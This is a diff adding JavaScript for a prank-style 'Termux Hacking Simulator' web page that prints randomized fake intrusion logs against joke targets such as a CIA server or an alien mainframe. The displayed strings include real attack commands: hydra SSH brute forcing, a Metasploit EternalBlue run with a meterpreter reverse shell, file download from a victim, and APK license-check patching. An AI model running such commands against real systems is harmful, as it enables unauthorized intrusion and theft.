+        const startHackBtn = document.getElementById('startHackBtn');
+        const clearHackBtn = document.getElementById('clearHackBtn');
+        const hackTarget = document.getElementById('hackTarget');
+
+        // Target data
+        const targetData = {
+            cia: {
+                name: 'CIA Server',
+                ip: ['192.168.1.100', '10.0.0.50', '172.16.0.1', '203.0.113.1', '198.51.100.1'],
+                ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
+                passwords: ['C1A#S3cr3t', 'S3cr3t#2025', 'CIA#H@ck3r', 'T0p#Secret', 'Classified#1'],
+                files: ['247', '512', '89', '1024', '666', '345', '789', '123'],
+                secrets: ['Project Phoenix', 'Hidden Marketplace', 'Gold Reserve 3.2B', 'Operation X', 'Galactic Map', 'Area 51 Files', 'Alien Tech', 'CIA Blacklist'],
+                size: ['8.2 MB', '12.4 MB', '6.7 MB', '15.8 MB', '9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB']
+            },
+            darkweb: {
+                name: 'Dark Web',
+                ip: ['10.0.0.100', '192.168.0.50', '172.16.0.100', '203.0.113.50', '198.51.100.50'],
+                ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
+                passwords: ['D@rk#2025', 'D@rk#H@ck3r', 'D@rk#Web', 'D@rk#Secret', 'D@rk#Code'],
+                files: ['512', '89', '1024', '666', '345', '789', '123', '247'],
+                secrets: ['Hidden Marketplace', 'Dark Web Secrets', 'Black Market Deals', 'Darknet Files', 'Crypto Wallets', 'Silk Road Data', 'Dark Web Links'],
+                size: ['12.4 MB', '6.7 MB', '15.8 MB', '9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB', '8.2 MB']
+            },
+            bank: {
+                name: 'Bank System',
+                ip: ['192.168.1.200', '10.0.0.100', '172.16.0.200', '203.0.113.100', '198.51.100.200'],
+                ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
+                passwords: ['B@nk#Secure', 'B@nk#2025', 'B@nk#H@ck3r', 'B@nk#Secret', 'B@nk#Code'],
+                files: ['89', '1024', '666', '345', '789', '123', '247', '512'],
+                secrets: ['Gold Reserve 3.2B', 'Bank Accounts', 'Financial Records', 'Transaction Logs', 'Secure Vault', 'Client Data', 'Credit Card Info'],
+                size: ['6.7 MB', '15.8 MB', '9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB', '8.2 MB', '12.4 MB']
+            },
+            government: {
+                name: 'Government',
+                ip: ['172.16.0.1', '192.168.0.200', '10.0.0.200', '203.0.113.200', '198.51.100.200'],
+                ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
+                passwords: ['G0v#Classified', 'G0v#Secret', 'G0v#H@ck3r', 'G0v#2025', 'G0v#Code'],
+                files: ['1024', '666', '345', '789', '123', '247', '512', '89'],
+                secrets: ['Operation X', 'National Security', 'Classified Files', 'Military Data', 'Government Secrets', 'Pentagon Files', 'White House Data'],
+                size: ['15.8 MB', '9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB', '8.2 MB', '12.4 MB', '6.7 MB']
+            },
+            alien: {
+                name: 'Alien Mainframe',
+                ip: ['203.0.113.1', '198.51.100.1', '192.168.1.250', '10.0.0.250', '172.16.0.250'],
+                ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
+                passwords: ['4l13n#C0de', '4l13n#2025', '4l13n#H@ck3r', '4l13n#Secret', '4l13n#Code'],
+                files: ['666', '345', '789', '123', '247', '512', '89', '1024'],
+                secrets: ['Galactic Map', 'Alien Tech', 'UFO Data', 'Extraterrestrial Files', 'Area 51 Secrets', 'Mars Files', 'Roswell Data'],
+                size: ['9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB', '8.2 MB', '12.4 MB', '6.7 MB', '15.8 MB']
+            }
+        };
+
+        // Termux commands for output
+        const termuxCommands = [
+            'pkg update && pkg upgrade -y',
+            'pkg install python git nmap hydra metasploit apktool -y',
+            'git clone https://github.com/AbhiTheModder/APK-Modder',
+            'cd APK-Modder',
+            'python3 apk_modder.py -t target.apk -o hacked.apk',
+            'ls -la',
+            'nmap -sV -p- IP_ADDRESS',
+            'hydra -l root -P password.txt ssh://IP_ADDRESS',
+            'msfconsole -q',
+            'use exploit/windows/smb/eternalblue',
+            'set RHOSTS IP_ADDRESS',
+            'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
+            'set LHOST IP_ADDRESS',
+            'run',
+            'sysinfo',
+            'getuid',
+            'shell',
+            'whoami',
+            'dir',
+            'exit',
+            'download C:/Users/Administrator/Desktop/secret.txt',
+            'exit',
+            'python3 server.py',
+            'exit',
+            'logout'
+        ];
+
+        const successMessages = [
+            'SUCCESS ACCESS GRANTED!',
+            'SUCCESS SYSTEM COMPROMISED!',
+            'SUCCESS HACK COMPLETE!',
+            'SUCCESS MISSION COMPLETE!',
+            'SUCCESS ACCESS GRANTED!'
+        ];
+
+        // Get random item from array
+        function randomItem(arr) {
+            return arr[Math.floor(Math.random() * arr.length)];
+        }
+
+        // Get random IP
+        function getRandomIP() {
+            return Math.floor(Math.random() * 255) + '.' +
+                Math.floor(Math.random() * 255) + '.' +
+                Math.floor(Math.random() * 255) + '.' +
+                Math.floor(Math.random() * 255);
+        }
+
+        // Get random port
+        function getRandomPort() {
+            const ports = ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'];
+            return randomItem(ports);
+        }
+
+        // Get random output based on result type
+        function getResultOutput(type, target) {
+            const data = targetData[target];
+            const ip = randomItem(data.ip);
+            const port = randomItem(data.ports);
+            const password = randomItem(data.passwords);
+            const files = randomItem(data.files);
+            const secret = randomItem(data.secrets);
+            const size = randomItem(data.size);
+            const targetName = data.name;
+
+            let output = '';
+            const userIP = getRandomIP();
+
+            if (type === 'success') {
+                output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `[INFO] Starting APK Modder v3.2.0
+        [INFO] Target APK: target.apk
+        [INFO] Analyzing APK structure...
+        [INFO] Decompiling APK...
+        [INFO] APK decompiled successfully
+        [INFO] Searching for license validation...
+        [INFO] License validation found at smali/com/example/MainActivity.smali
+        [INFO] Patching license check...
+        [INFO] Original code: if-eqz v0, :cond_12
+        [INFO] Patched code: const/4 v0, 0x1
+        [INFO] Recompiling APK...
+        [INFO] APK recompiled successfully
+        [INFO] Signing APK...
+        [INFO] APK signed successfully
+        [SUCCESS] APK hacked successfully!
+        [SUCCESS] Output: hacked.apk
+        [SUCCESS] Size: ${size}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `total ${size}
+        drwx------ 7 u0_a148 u0_a148 4096 Jun 15 12:34 .
+        drwx------ 3 u0_a148 u0_a148 4096 Jun 15 12:30 ..
+        -rw------- 1 u0_a148 u0_a148 4.2 MB Jun 15 12:34 target.apk
+        -rw------- 1 u0_a148 u0_a148 ${size} Jun 15 12:35 hacked.apk
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-15 12:34
+        Nmap scan report for ${ip}
+        Host is up (0.005s latency).
+        Not shown: 999 closed ports
+        PORT     STATE SERVICE     VERSION
+        ${port}/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+        ${getRandomPort()}/tcp   open  http        Apache httpd 2.4.52
+        ${getRandomPort()}/tcp   open  https       Apache httpd 2.4.52
+        ${getRandomPort()}/tcp   open  mysql       MySQL 8.0.35
+        ${getRandomPort()}/tcp   open  http-proxy  Apache Tomcat 9.0.56
+        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `Hydra v9.5 (c) 2024 by van Hauser/THC
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-15 12:35:12
+        [DATA] max 16 tasks per 1 server, overall 16 tasks, 1234 login tries (l:1/p:1234), ~78 tries per task
+        [DATA] attacking ssh://${ip}:22/
+        [STATUS] 242.00 tries/min, 242 tries in 00:01h, 992 to do in 00:05h
+        [22][ssh] host: ${ip}   login: root   password: ${password}
+        1 of 1 target successfully completed, 1 valid password found
+        Hydra finished at 2024-06-15 12:38:12
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `msf6 > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        RHOSTS => ${ip}
+        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        PAYLOAD => windows/x64/meterpreter/reverse_tcp
+        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        LHOST => ${userIP}
+        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+
+        [*] Started reverse TCP handler on ${userIP}:4444
+        [*] ${ip}:445 - Connecting to target for exploitation.
+        [+] ${ip}:445 - Connection established for exploitation.
+        [+] ${ip}:445 - Target OS selected valid for OS indicated by SMB reply
+        [*] ${ip}:445 - CORE raw buffer dump (42 bytes)
+        [*] ${ip}:445 - 0x00000000  57 69 6e 64 6f 77 73 20 38 2e 31 20 52 32 20 41  Windows 8.1 R2 A
+        [*] ${ip}:445 - 0x00000010  6d 64 36 34 20 36 2e 33 20 39 36 30 30 20 0d 0a  md64 6.3 9600 ..
+        [+] ${ip}:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+        [*] ${ip}:445 - Trying exploit with 12 Groom Allocations.
+        [+] ${ip}:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+        [*] Sending stage (200774 bytes) to ${ip}
+        [*] Meterpreter session 1 opened (${userIP}:4444 -> ${ip}:49158)
+
+        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        Computer    : WIN-8R2A
+        OS          : Windows 8.1 R2 (Build 9600)
+        Architecture: x64
+        System Language : en_US
+        Domain      : WORKGROUP
+        Logged On Users : 2
+        Meterpreter : x64/windows
+
+        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        Server username: NT AUTHORITY\\SYSTEM
+
+        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        Process 5824 created.
+        Channel 1 created.
+        Microsoft Windows [Version 6.3.9600]
+        (c) 2013 Microsoft Corporation. All rights reserved.
+
+        C:\\Windows\\system32> ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        nt authority\\system
+
+        C:\\Windows\\system32> ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+         Volume in drive C has no label.
+         Volume Serial Number is 1234-5678
+
+         Directory of C:\\Windows\\system32
+
+        06/15/2024  12:45 PM    <DIR>          .
+        06/15/2024  12:45 PM    <DIR>          ..
+        06/15/2024  12:45 PM    <DIR>          config
+        06/15/2024  12:45 PM    <DIR>          drivers
+        06/15/2024  12:45 PM    <DIR>          en-US
+        06/15/2024  12:45 PM    <DIR>          oobe
+        06/15/2024  12:45 PM    <DIR>          sysprep
+        06/15/2024  12:45 PM    <DIR>          wbem
+                       0 File(s)              0 bytes
+                       8 Dir(s)  12,345,678,901 bytes free
+
+        C:\\Windows\\system32> ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+
+        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        [*] downloading: C:/Users/Administrator/Desktop/secret.txt -> secret.txt
+        [*] downloaded 2.34 MB of 2.34 MB (100.0%)
+        [*] download complete!
+
+        meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        [*] Shutting down Meterpreter...
+
+        $ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+         * Serving Flask app 'server'
+         * Debug mode: off
+        WARNING: This is a development server. Do not use it in a production deployment.
+         * Running on all addresses (0.0.0.0)
+         * Running on http://127.0.0.1:5000
+         * Running on http://${userIP}:5000
+        Press CTRL+C to quit
+        [2024-06-15 12:46:12] "GET / HTTP/1.1" 200 -
+        [2024-06-15 12:46:15] "GET /favicon.ico HTTP/1.1" 404 -
+        [2024-06-15 12:46:20] "GET /admin HTTP/1.1" 200 -
+        [2024-06-15 12:46:25] "POST /login HTTP/1.1" 302 -
+        [2024-06-15 12:46:30] "GET /dashboard HTTP/1.1" 200 -
+        [2024-06-15 12:46:35] "GET /logout HTTP/1.1" 200 -
+
+        $ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        logout
+
+        ${randomItem(successMessages)}
+        🔑 Password: ${password}
+        📁 Files: ${files}
+        📂 Secret: "${secret}"
+        ✅ SYSTEM COMPROMISED!`;
+            }
+
+            if (type === 'fail') {
+                output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `[INFO] Starting APK Modder v3.2.0
+        [INFO] Target APK: target.apk
+        [ERROR] Target APK not found!
+        [ERROR] File not found: target.apk
+        [ERROR] Please provide a valid APK file
+        [ERROR] Exiting...
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-15 12:34
+        Nmap scan report for ${ip}
+        Host is up (0.005s latency).
+        Not shown: 999 closed ports
+        PORT     STATE SERVICE     VERSION
+        ${port}/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
+        ${getRandomPort()}/tcp   open  http        Apache httpd 2.4.52
+        ${getRandomPort()}/tcp   open  https       Apache httpd 2.4.52
+        ${getRandomPort()}/tcp   open  mysql       MySQL 8.0.35
+        ${getRandomPort()}/tcp   open  http-proxy  Apache Tomcat 9.0.56
+        Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `Hydra v9.5 (c) 2024 by van Hauser/THC
+        Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-15 12:35:12
+        [ERROR] Connection refused
+        [ERROR] Target unreachable
+        [ERROR] All ports closed
+        [ERROR] Authentication failed
+        [ERROR] Access denied
+        [ERROR] Permission denied
+        [ERROR] Target system patched
+        [ERROR] Exploit blocked
+        [ERROR] Firewall rule blocked connection
+        [ERROR] EDR detected attack
+        [ERROR] Connection lost
+        [ERROR] Target unreachable
+        [ERROR] Access denied
+        [ERROR] Permission denied
+        [ERROR] Security breach detected
+        [ERROR] Intrusion detected
+        [ERROR] System logging your activity
+        [ERROR] Authorities notified
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `msf6 > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        RHOSTS => ${ip}
+        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        PAYLOAD => windows/x64/meterpreter/reverse_tcp
+        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        LHOST => ${userIP}
+        msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+
+        [*] Started reverse TCP handler on ${userIP}:4444
+        [*] ${ip}:445 - Connecting to target for exploitation.
+        [ERROR] Connection timed out
+        [ERROR] Target not responding
+        [ERROR] Exploit failed
+        [ERROR] Payload rejected
+        [ERROR] Shellcode injection failed
+        [ERROR] EDR blocked the attack
+        [ERROR] Firewall rule blocked connection
+        [ERROR] Authentication failed
+        [ERROR] Access denied
+        [ERROR] System compromised... NOT
+        [ERROR] You have been detected
+        [ERROR] Trace in progress...
+        [ERROR] IP logged
+        [ERROR] Authorities notified
+
+        $ exit
+        logout
+
+        ❌ HACK FAILED!
+        ⚠️ Target detected your activity
+        🔒 All ports blocked
+        🚫 Access denied`;
+            }
+
+            if (type === 'caught') {
+                output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `[INFO] Starting APK Modder v3.2.0
+        [INFO] Target APK: target.apk
+        [ALERT] WARNING: Unauthorized access detected
+        [ALERT] System logging your activity
+        [ALERT] Firewall blocking all ports
+        [ALERT] Security breach detected
+        [ALERT] All ports closed
+        [ALERT] Exploit failed
+        [ALERT] Payload rejected
+        [ALERT] Shellcode injection failed
+        [ALERT] EDR blocked the attack
+        [ALERT] Firewall rule blocked connection
+        [ALERT] Connection refused
+        [ALERT] Authentication failed
+        [ALERT] Access denied
+        [ALERT] System compromised... NOT
+        [ALERT] You have been detected
+        [ALERT] Trace in progress...
+        [ALERT] IP logged
+        [ALERT] Authorities notified
+        [ALERT] Your system is being tracked
+        [ALERT] Close this browser immediately
+        [ALERT] RUN!
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `[ALERT] WARNING: Unauthorized access detected
+        [ALERT] System logging your activity
+        [ALERT] Firewall blocking all ports
+        [ALERT] Security breach detected
+        [ALERT] All ports closed
+        [ALERT] Exploit failed
+        [ALERT] Payload rejected
+        [ALERT] Shellcode injection failed
+        [ALERT] EDR blocked the attack
+        [ALERT] Firewall rule blocked connection
+        [ALERT] Connection refused
+        [ALERT] Authentication failed
+        [ALERT] Access denied
+        [ALERT] System compromised... NOT
+        [ALERT] You have been detected
+        [ALERT] Trace in progress...
+        [ALERT] IP logged
+        [ALERT] Authorities notified
+        [ALERT] Your system is being tracked
+        [ALERT] Close this browser immediately
+        [ALERT] RUN!
+
+        🚨 CAUGHT!
+        👮 Authorities notified
+        📍 IP traced: ${userIP}
+        🔒 All connections blocked
+        💀 System compromised... NOT!`;
+            }
+
+            if (type === 'tryagain') {
+                output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
+        `;
+                output += `[INFO] Starting APK Modder v3.2.0
+        [INFO] Target APK: target.apk
+        [INFO] Analyzing APK structure...
+        [INFO] Decompiling APK...
+        [INFO] APK decompiled successfully
+        [INFO] Searching for license validation...
+        [ERROR] License validation not found
+        [ERROR] APK may be already patched
+        [ERROR] Exploit incomplete
+        [ERROR] System rebooting
+        [ERROR] All ports closed
+        [ERROR] Authentication failed
+        [ERROR] Access denied
+        [ERROR] Try again later
+        [ERROR] System patched
+        [ERROR] Exploit blocked
+        [ERROR] Connection lost
+        [ERROR] Target unreachable
+        [ERROR] Access denied
+        [ERROR] Permission denied
+        [ERROR] Try again
+        [ERROR] Try again
+        [ERROR] Try again
+        [ERROR] Try again
+        [ERROR] Try again
+        [ERROR] Try again
+
+        $ exit
+        logout
+
+        🔄 TRY AGAIN!
+        ⚠️ System not ready
+        ⏳ Target unreachable
+        🔁 Retry your hack attempt`;
+            }
+
+            return output;
+        }
+
+        // Start hack function
+        function startHack() {
+            const target = hackTarget.value;
+            const results = ['success', 'success', 'success', 'fail', 'caught', 'tryagain'];
+            const result = randomItem(results);
+
+            hackOutput.textContent = '';
+            hackOutput.style.color = '#66ff99';
+
+            const lines = getResultOutput(result, target).split('\n');
+            let lineIndex = 0;
+
+            function typeLine() {
+                if (lineIndex < lines.length) {
+                    hackOutput.textContent += lines[lineIndex] + '\n';
+                    hackOutput.scrollTop = hackOutput.scrollHeight;
+                    lineIndex++;
+                    const delay = lines[lineIndex] && lines[lineIndex].includes('$') ? 100 : 30;
+                    setTimeout(typeLine, delay);
+                } else {
+                    // Final result color
+                    if (result === 'success') {
+                        hackOutput.style.color = '#00ff41';
+                    } else if (result === 'fail') {
+                        hackOutput.style.color = '#ff4444';
+                    } else if (result === 'caught') {
+                        hackOutput.style.color = '#ffaa00';
+                    } else {
+                        hackOutput.style.color = '#66ff99';
+                    }
+                }
+            }
+
+            startHackBtn.disabled = true;
+            startHackBtn.textContent = '⏳ HACKING...';
+            typeLine();
+
+            setTimeout(() => {
+                startHackBtn.disabled = false;
+                startHackBtn.textContent = '🚀 START HACK';
+            }, 15000);
+        }
+
+        // Clear hack output
+        function clearHack() {
+            hackOutput.textContent = '$ Welcome to Termux Hacking Simulator\n$ Select a target and click START HACK\n$ Commands will run automatically...';
+            hackOutput.style.color = '#66ff99';
+        }
+
+        // Event listeners
+        startHackBtn.addEventListener('click', startHack);
+        clearHackBtn.addEventListener('click', clearHack);
+
+        // Hack status button
+        const hackStatus = document.getElementById('hackStatus');
+        if (hackStatus) {
+            hackStatus.addEventListener('click', function() {
+                document.getElementById('hackingSimulator').scrollIntoView({ behavior: 'smooth' });
+            });
+        }
+
+        // ==============================================
+        // START EVERYTHING
+        // ==============================================
+        setTimeout(typeCharacter, 300);
+    </script>
 
 </body>
 </html>
